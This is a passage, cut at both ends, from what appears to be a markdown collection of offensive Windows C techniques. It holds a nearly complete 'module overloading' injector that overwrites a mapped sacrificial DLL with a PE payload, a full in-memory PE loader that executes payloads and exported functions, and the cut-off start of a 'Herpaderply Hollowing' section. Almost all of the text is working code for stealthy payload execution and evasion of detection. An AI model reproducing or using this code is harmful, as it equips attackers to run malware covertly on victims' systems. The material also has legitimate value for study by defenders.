	IN  ULONG				SectionPageProtection,
	IN  ULONG				AllocationAttributes,
	IN  HANDLE				FileHandle			OPTIONAL
	);

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
	IN		HANDLE			SectionHandle,
	IN		HANDLE			ProcessHandle,
	IN OUT	PVOID*			BaseAddress,
	IN		SIZE_T			ZeroBits,
	IN		SIZE_T			CommitSize,
	IN OUT	PLARGE_INTEGER	SectionOffset		OPTIONAL,
	IN OUT	PSIZE_T			ViewSize,
	IN		SECTION_INHERIT InheritDisposition,
	IN		ULONG			AllocationType,
	IN		ULONG			Protect
	);

typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(
	IN HANDLE	ProcessHandle,
	IN PVOID	BaseAddress			OPTIONAL
	);


typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(
	IN		HANDLE		ProcessHandle,
	IN OUT	PVOID* BaseAddress,
	IN OUT	PSIZE_T		NumberOfBytesToProtect,
	IN		ULONG		NewAccessProtection,
	OUT		PULONG		OldAccessPRotection
	);


typedef NTSTATUS(NTAPI* fnNtCreateFile)(
	OUT  PHANDLE            FileHandle,
	IN   ACCESS_MASK        DesiredAccess,
	IN   POBJECT_ATTRIBUTES ObjectAttributes,
	OUT  PIO_STATUS_BLOCK   IoStatusBlock,
	IN	 PLARGE_INTEGER     AllocationSize		OPTIONAL,
	IN   ULONG              FileAttributes,
	IN   ULONG              ShareAccess,
	IN   ULONG              CreateDisposition,
	IN   ULONG              CreateOptions,
	IN   PVOID              EaBuffer,
	IN   ULONG              EaLength
	);

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _NT_API {

	fnNtCreateFile				pNtCreateFile;
	fnNtCreateSection			pNtCreateSection;
	fnNtUnmapViewOfSection		pNtUnmapViewOfSection;
	fnNtMapViewOfSection		pNtMapViewOfSection;
	fnNtProtectVirtualMemory	pNtProtectVirtualMemory;

}NT_API, * PNT_API;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

NT_API g_NtApi = { 0x00 };

// ==========================================================================================================================================================
// ==========================================================================================================================================================

#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}

// ==========================================================================================================================================================

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// ==========================================================================================================================================================

BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll = NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		printf("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_NtApi.pNtCreateFile			= (fnNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
	g_NtApi.pNtCreateSection		= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pNtMapViewOfSection		= (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	g_NtApi.pNtUnmapViewOfSection	= (fnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	g_NtApi.pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

	if (!g_NtApi.pNtCreateFile || !g_NtApi.pNtCreateSection || !g_NtApi.pNtMapViewOfSection || !g_NtApi.pNtUnmapViewOfSection || !g_NtApi.pNtProtectVirtualMemory)
		return FALSE;

	return TRUE;
}

// ==========================================================================================================================================================

BOOL InjectPeViaModuleOverLoading(IN LPWSTR szSacrificialDllPath, IN ULONG_PTR uPeFileBuffer, IN SIZE_T sPeFileSize) {

	BOOL							bResult					= FALSE;
	NTSTATUS						STATUS					= STATUS_SUCCESS;
	HANDLE							hFile					= NULL,
									hSection				= NULL;
	WCHAR							szNtPathDll[MAX_PATH]	= { 0 };
	OBJECT_ATTRIBUTES				ObjAttributes			= { 0 };
	UNICODE_STRING					UnicodeStr				= { 0 };
	IO_STATUS_BLOCK					IOStatusBlock			= { 0 };
	PVOID							pTmpPntrVar				= NULL;
	SIZE_T							sViewSize				= NULL,
									sTmpSizeVar				= NULL;
	ULONG_PTR						uMappedViewAddress		= NULL,
									uDeltaOffset			= NULL;
	PIMAGE_NT_HEADERS				pImgNtHdrs				= NULL;
	PIMAGE_SECTION_HEADER			pImgSecHdr				= NULL;
	PIMAGE_DATA_DIRECTORY			pTmpDataDirVar			= NULL;
	PIMAGE_IMPORT_DESCRIPTOR		pImgDescriptor			= NULL;
	PIMAGE_BASE_RELOCATION			pImgBaseRelocation		= NULL;
	PBASE_RELOCATION_ENTRY			pBaseRelocEntry			= NULL;
	PIMAGE_RUNTIME_FUNCTION_ENTRY	pImgRuntimeFuncEntry	= NULL;
	PIMAGE_TLS_DIRECTORY			pImgTlsDirectory		= NULL;
	PIMAGE_TLS_CALLBACK*			ppImgTlsCallback		= NULL;
	CONTEXT							ThreadContext			= { 0 };
	DWORD							dwOldProtection			= 0x00;

	if (!szSacrificialDllPath || !uPeFileBuffer || !sPeFileSize)
		return FALSE;

	if (!InitializeSyscallsStruct())
		return FALSE;

	wsprintfW(szNtPathDll, L"\\??\\\\%s", szSacrificialDllPath);
	RtlInitUnicodeString(&UnicodeStr, szNtPathDll);
	InitializeObjectAttributes(&ObjAttributes, &UnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateFile(&hFile, FILE_GENERIC_READ, &ObjAttributes, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || !hFile) {
		printf("[!] NtCreateFile Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Mapping The Sacrificial DLL Into Local Process ...");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hSection, NtCurrentProcess(), &uMappedViewAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE)))) {
		printf("[!] NtMapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	printf("[+] DONE \n");
	printf("[*] Mapped At: 0x%p \n", uMappedViewAddress);

	if (sViewSize < sPeFileSize) {
		printf("[!] The Sacrificial DLL Size Is Less Than The PE Payload \n");
		goto _END_OF_FUNC;
	}

	pTmpPntrVar = uMappedViewAddress;
	sTmpSizeVar = sViewSize;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(NtCurrentProcess(), &pTmpPntrVar, &sTmpSizeVar, PAGE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	memset(uMappedViewAddress, 0x00, sViewSize);

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPeFileBuffer + ((PIMAGE_DOS_HEADER)uPeFileBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	// Copying The PE Headers Of The PE Payload
	memcpy(uMappedViewAddress, uPeFileBuffer, pImgNtHdrs->OptionalHeader.SizeOfHeaders);

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uMappedViewAddress + ((PIMAGE_DOS_HEADER)uMappedViewAddress)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);

	printf("[i] Overwriting Sacrificial DLL With Payload's PE Sections ... \n");

	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
		printf("\t<i> Writing Section %s At %p Of Size %d \n", pImgSecHdr[i].Name, (void*)(uMappedViewAddress + pImgSecHdr[i].VirtualAddress), (int)pImgSecHdr[i].SizeOfRawData);
		memcpy((PVOID)(uMappedViewAddress + pImgSecHdr[i].VirtualAddress), (PVOID)(uPeFileBuffer + pImgSecHdr[i].PointerToRawData), pImgSecHdr[i].SizeOfRawData);
	}

	// Fix Import Address Table

	printf("[i] Fixing The Import Address Table ... ");

	pTmpDataDirVar = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	for (SIZE_T i = 0; i < pTmpDataDirVar->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

		pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(uMappedViewAddress + pTmpDataDirVar->VirtualAddress + i);
		if (pImgDescriptor->OriginalFirstThunk == NULL && pImgDescriptor->FirstThunk == NULL)
			break;

		LPSTR		cDllName				= (LPSTR)(uMappedViewAddress + pImgDescriptor->Name);
		ULONG_PTR	uOriginalFirstThunkRVA	= pImgDescriptor->OriginalFirstThunk;
		ULONG_PTR	uFirstThunkRVA			= pImgDescriptor->FirstThunk;
		SIZE_T		ImgThunkSize			= 0x00;
		HMODULE		hModule					= NULL;

		if (!(hModule = LoadLibraryA(cDllName))) {
			printf("[!] LoadLibraryA Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		while (TRUE) {

			PIMAGE_THUNK_DATA			pOriginalFirstThunk		= (PIMAGE_THUNK_DATA)(uMappedViewAddress + uOriginalFirstThunkRVA + ImgThunkSize);
			PIMAGE_THUNK_DATA			pFirstThunk				= (PIMAGE_THUNK_DATA)(uMappedViewAddress + uFirstThunkRVA + ImgThunkSize);
			PIMAGE_IMPORT_BY_NAME		pImgImportByName		= NULL;
			ULONG_PTR					pFuncAddress			= NULL;

			if (pOriginalFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal)))) {
					printf("[!] Could Not Import !%s#%d \n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
					goto _END_OF_FUNC;
				}
			}
			else {
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(uMappedViewAddress + pOriginalFirstThunk->u1.AddressOfData);
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, pImgImportByName->Name))) {
					printf("[!] Could Not Import !%s.%s \n", cDllName, pImgImportByName->Name);
					goto _END_OF_FUNC;
				}
			}

			pFirstThunk->u1.Function	= (ULONGLONG)pFuncAddress;
			ImgThunkSize				+= sizeof(IMAGE_THUNK_DATA);
		}
	}

	printf("[+] DONE \n");


	// Perform PE Relocation

	printf("[i] Fixing PE Relocations ... ");

	pTmpDataDirVar		= &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pImgBaseRelocation	= uMappedViewAddress + pTmpDataDirVar->VirtualAddress;
	uDeltaOffset		= uMappedViewAddress - pImgNtHdrs->OptionalHeader.ImageBase;

	while (pImgBaseRelocation->VirtualAddress) {

		pBaseRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

		while ((PBYTE)pBaseRelocEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock) {
			switch (pBaseRelocEntry->Type) {
				case IMAGE_REL_BASED_DIR64:
					*((ULONG_PTR*)(uMappedViewAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += uDeltaOffset;
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					*((DWORD*)(uMappedViewAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += (DWORD)uDeltaOffset;
					break;
				case IMAGE_REL_BASED_HIGH:
					*((WORD*)(uMappedViewAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += HIWORD(uDeltaOffset);
					break;
				case IMAGE_REL_BASED_LOW:
					*((WORD*)(uMappedViewAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += LOWORD(uDeltaOffset);
					break;
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				default:
					printf("[!] Unknown Relocation Type [%d] Of Offset: 0x%08X \n", pBaseRelocEntry->Type, pBaseRelocEntry->Offset);
					goto _END_OF_FUNC;
			}

			pBaseRelocEntry++;
		}

		pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocEntry;
	}

	printf("[+] DONE \n");

	// Fix Memory Permissions

	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		DWORD		dwProtection		= 0x00,
					dwOldProtection		= 0x00;
		pTmpPntrVar						= (PVOID)(uMappedViewAddress + pImgSecHdr[i].VirtualAddress);
		sTmpSizeVar						= (SIZE_T)pImgSecHdr[i].SizeOfRawData;

		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
			continue;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READ;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(NtCurrentProcess(), &pTmpPntrVar, &sTmpSizeVar, dwProtection, &dwOldProtection)))) {
			printf("[!] NtProtectVirtualMemory [%s] Failed With Error: 0x%0.8X \n", pImgSecHdr[i].Name, STATUS);
			goto _END_OF_FUNC;
		}
	}

	printf("[+] Set The Right Memory Permission For Each PE Section \n");

	// Register Exception Directory

	pTmpDataDirVar = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (pTmpDataDirVar->Size) {

		pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(uMappedViewAddress + pTmpDataDirVar->VirtualAddress);

		if (!RtlAddFunctionTable(pImgRuntimeFuncEntry, (pTmpDataDirVar->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), uMappedViewAddress)) {
			printf("[!] RtlAddFunctionTable Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		printf("[+] Registered Exception Handlers \n");
	}

	// Execute TLS Callbacks

	pTmpDataDirVar = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (pTmpDataDirVar->Size) {
		pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)(uMappedViewAddress + pTmpDataDirVar->VirtualAddress);
		ppImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);

		for (int i = 0; ppImgTlsCallback[i] != NULL; i++)
			ppImgTlsCallback[i]((LPVOID)uMappedViewAddress, DLL_PROCESS_ATTACH, &ThreadContext);

		printf("[+] Executed All TLS Callback Functions \n");
	}


	// Execute Entry Point

	if (pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) {

		BOOL(WINAPI * pDllMainFunc)(HINSTANCE, DWORD, LPVOID) = uMappedViewAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
		HANDLE		hThread = NULL;

		printf("[*] Executing DllMain ... \n");

		pDllMainFunc((HINSTANCE)uMappedViewAddress, DLL_PROCESS_ATTACH, NULL);

	}
	else {
		printf("[*] Executing Main ... \n");

		BOOL(WINAPI * pMainFunc)(VOID) = uMappedViewAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
		pMainFunc();
	}

	bResult = TRUE;

_END_OF_FUNC:
	DELETE_HANDLE(hFile);
	DELETE_HANDLE(hSection);
	if (uMappedViewAddress)
		g_NtApi.pNtUnmapViewOfSection(NtCurrentProcess(), uMappedViewAddress);
	return bResult;
}
```
### Local PE Execution
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

BOOL LocalPeExec(IN ULONG_PTR uPeFileBuffer, IN SIZE_T sPeFileSize, IN OPTIONAL LPCSTR cExportedFuncName) {

	ULONG_PTR						uBaseAdddress				= NULL,
									uDeltaOffset				= NULL,
									uExportedFuncAddress		= NULL;
	PIMAGE_NT_HEADERS				pImgNtHdrs					= NULL;
	PIMAGE_SECTION_HEADER			pImgSecHdr					= NULL;
	PIMAGE_DATA_DIRECTORY			pTmpDataDirVar				= NULL;
	PIMAGE_IMPORT_DESCRIPTOR		pImgDescriptor				= NULL;
	PIMAGE_BASE_RELOCATION			pImgBaseRelocation			= NULL;
	PBASE_RELOCATION_ENTRY			pBaseRelocEntry				= NULL;
	PIMAGE_EXPORT_DIRECTORY			pImgExportDir				= NULL;
	PIMAGE_RUNTIME_FUNCTION_ENTRY	pImgRuntimeFuncEntry		= NULL;
	PIMAGE_TLS_DIRECTORY			pImgTlsDirectory			= NULL;
	PIMAGE_TLS_CALLBACK*			ppImgTlsCallback			= NULL;
	CONTEXT							ThreadContext				= { 0 };

	if (!uPeFileBuffer || !sPeFileSize)
		return FALSE;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPeFileBuffer + ((PIMAGE_DOS_HEADER)uPeFileBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	// Allocating Memory

	if (!(uBaseAdddress = VirtualAlloc(NULL, pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
		printf("[!] VirtualAlloc Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] Allocated Image Base Address: 0x%p\n", (LPVOID)uBaseAdddress);
	printf("[i] Preferable Base Address: 0x%p\n", (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase);

	// Writing PE Sections

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	printf("[i] Writing Payload's PE Sections ... \n");
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
		printf("\t<i> Writing Section %s At %p Of Size %d \n", pImgSecHdr[i].Name, (void*)(uBaseAdddress + pImgSecHdr[i].VirtualAddress), (int)pImgSecHdr[i].SizeOfRawData);
		memcpy((PVOID)(uBaseAdddress + pImgSecHdr[i].VirtualAddress), (PVOID)(uPeFileBuffer + pImgSecHdr[i].PointerToRawData), pImgSecHdr[i].SizeOfRawData);
	}

	// Fix Import Address Table

	printf("[i] Fixing The Import Address Table ... ");

	pTmpDataDirVar = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	for (SIZE_T i = 0; i < pTmpDataDirVar->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {

		pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(uBaseAdddress + pTmpDataDirVar->VirtualAddress + i);
		if (pImgDescriptor->OriginalFirstThunk == NULL && pImgDescriptor->FirstThunk == NULL)
			break;

		LPSTR		cDllName					= (LPSTR)(uBaseAdddress + pImgDescriptor->Name);
		ULONG_PTR	uOriginalFirstThunkRVA		= pImgDescriptor->OriginalFirstThunk;
		ULONG_PTR	uFirstThunkRVA				= pImgDescriptor->FirstThunk;
		SIZE_T		ImgThunkSize				= 0x00;
		HMODULE		hModule						= NULL;

		if (!(hModule = LoadLibraryA(cDllName))) {
			printf("[!] LoadLibraryA Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		while (TRUE) {

			PIMAGE_THUNK_DATA			pOriginalFirstThunk		= (PIMAGE_THUNK_DATA)(uBaseAdddress + uOriginalFirstThunkRVA + ImgThunkSize);
			PIMAGE_THUNK_DATA			pFirstThunk				= (PIMAGE_THUNK_DATA)(uBaseAdddress + uFirstThunkRVA + ImgThunkSize);
			PIMAGE_IMPORT_BY_NAME		pImgImportByName		= NULL;
			ULONG_PTR					pFuncAddress			= NULL;

			if (pOriginalFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal)))) {
					printf("[!] Could Not Import !%s#%d \n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
					return FALSE;
				}
			}
			else {
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(uBaseAdddress + pOriginalFirstThunk->u1.AddressOfData);
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, pImgImportByName->Name))) {
					printf("[!] Could Not Import !%s.%s \n", cDllName, pImgImportByName->Name);
					return FALSE;
				}
			}

			pFirstThunk->u1.Function	= (ULONGLONG)pFuncAddress;
			ImgThunkSize				+= sizeof(IMAGE_THUNK_DATA);
		}
	}

	printf("[+] DONE \n");


	// Perform PE Relocation

	printf("[i] Fixing PE Relocations ... ");

	pTmpDataDirVar		= &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pImgBaseRelocation	= uBaseAdddress + pTmpDataDirVar->VirtualAddress;
	uDeltaOffset		= uBaseAdddress - pImgNtHdrs->OptionalHeader.ImageBase;

	while (pImgBaseRelocation->VirtualAddress) {

		pBaseRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

		while ((PBYTE)pBaseRelocEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock) {
			switch (pBaseRelocEntry->Type) {
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(uBaseAdddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += uDeltaOffset;
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(uBaseAdddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += (DWORD)uDeltaOffset;
				break;
			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(uBaseAdddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += HIWORD(uDeltaOffset);
				break;
			case IMAGE_REL_BASED_LOW:
				*((WORD*)(uBaseAdddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += LOWORD(uDeltaOffset);
				break;
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			default:
				printf("[!] Unknown relocation type: %d | Offset: 0x%08X \n", pBaseRelocEntry->Type, pBaseRelocEntry->Offset);
				return FALSE;
			}

			pBaseRelocEntry++;
		}

		pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocEntry;
	}

	printf("[+] DONE \n");

	// Fix Memory Permissions

	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		DWORD		dwProtection		= 0x00,
					dwOldProtection		= 0x00;

		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
			continue;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READ;

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;

		if (!VirtualProtect((PVOID)(uBaseAdddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
			printf("[!] VirtualProtect [%s] Failed With Error: %d \n", pImgSecHdr[i].Name, GetLastError());
			return FALSE;
		}
	}

	printf("[+] Set The Right Memory Permission For Each PE Section \n");

	// Fetch Exported Function Address

	if (cExportedFuncName) {

		pTmpDataDirVar	= &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
		pImgExportDir	= (PIMAGE_EXPORT_DIRECTORY)(uBaseAdddress + pTmpDataDirVar->VirtualAddress);

		if (pTmpDataDirVar->Size && pTmpDataDirVar->VirtualAddress) {

			PDWORD		FunctionNameArray		= (PDWORD)(uBaseAdddress + pImgExportDir->AddressOfNames);
			PDWORD		FunctionAddressArray	= (PDWORD)(uBaseAdddress + pImgExportDir->AddressOfFunctions);
			PWORD		FunctionOrdinalArray	= (PWORD)(uBaseAdddress + pImgExportDir->AddressOfNameOrdinals);

			for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

				if (strcmp(cExportedFuncName, (CHAR*)(uBaseAdddress + FunctionNameArray[i])) == 0x00) {
					uExportedFuncAddress = (ULONG_PTR)(uBaseAdddress + FunctionAddressArray[FunctionOrdinalArray[i]]);
					printf("[i] Fetched Optional Exported Function Address [ %s:0x%p ] \n", cExportedFuncName, uExportedFuncAddress);
					break;
				}
			}
		}
	}

	// Register Exception Directory

	pTmpDataDirVar = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (pTmpDataDirVar->Size) {

		pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(uBaseAdddress + pTmpDataDirVar->VirtualAddress);

		if (!RtlAddFunctionTable(pImgRuntimeFuncEntry, (pTmpDataDirVar->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), uBaseAdddress)) {
			printf("[!] RtlAddFunctionTable Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		printf("[+] Registered Exception Handlers \n");
	}

	// Execute TLS Callbacks

	pTmpDataDirVar = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (pTmpDataDirVar->Size) {
		pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)(uBaseAdddress + pTmpDataDirVar->VirtualAddress);
		ppImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);

		for (int i = 0; ppImgTlsCallback[i] != NULL; i++)
			ppImgTlsCallback[i]((LPVOID)uBaseAdddress, DLL_PROCESS_ATTACH, &ThreadContext);

		printf("[+] Executed All TLS Callback Functions \n");
	}

	// Execute Entry Point

	if (pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) {

		BOOL		(WINAPI* pDllMainFunc)(HINSTANCE, DWORD, LPVOID)	= uBaseAdddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
		HANDLE		hThread												= NULL;

		printf("[*] Executing DllMain ... \n");

		pDllMainFunc((HINSTANCE)uBaseAdddress, DLL_PROCESS_ATTACH, NULL);

		if (uExportedFuncAddress) {
			printf("[*] Executing The \"%s\" Exported Function ... \n", cExportedFuncName);

			if (!(hThread = CreateThread(NULL, 0x00, uExportedFuncAddress, NULL, 0x00, NULL))) {
				printf("[!] CreateThread Failed With Error: %d \n", GetLastError());
				return FALSE;
			}

			WaitForSingleObject(hThread, INFINITE);
		}
	}
	else {
		printf("[*] Executing Main ... \n");

		BOOL(WINAPI * pMainFunc)(VOID) = uBaseAdddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
		return pMainFunc();
	}

	return TRUE;
}
```
### Herpaderply Hollowing
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtCreateFile)(
